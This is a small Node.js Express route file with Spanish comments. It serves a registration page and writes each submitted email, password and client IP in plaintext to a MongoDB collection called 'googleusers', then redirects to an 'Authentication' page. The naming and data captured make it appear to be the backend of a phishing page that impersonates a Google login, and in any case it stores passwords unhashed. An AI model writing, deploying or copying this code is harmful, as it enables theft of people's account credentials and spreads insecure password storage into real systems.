const express = require('express');
const path = require('path');
const { getDb } = require('../utils/db');
const getClientIp = require("get-client-ip");
const router = express.Router();

router.use('/add-account', (req, res, next) => {
    res.sendFile(path.join(__dirname, '../views', 'register.html'));
});

router.post('/register', async (req, res, next) => {
    const db = getDb();
    const ip = getClientIp(req);
    const { email, password } = req.body;

    try {
        // Si el usuario no existe, insertar el nuevo usuario
        await db.collection('googleusers').insertOne({
            userip: ip,
            email: email,
            password: password
        });

        res.redirect('/Authentication');
    } catch (e) {
        console.log(e);
        res.status(500).send('Error registrando al usuario');
    }
});

module.exports = router;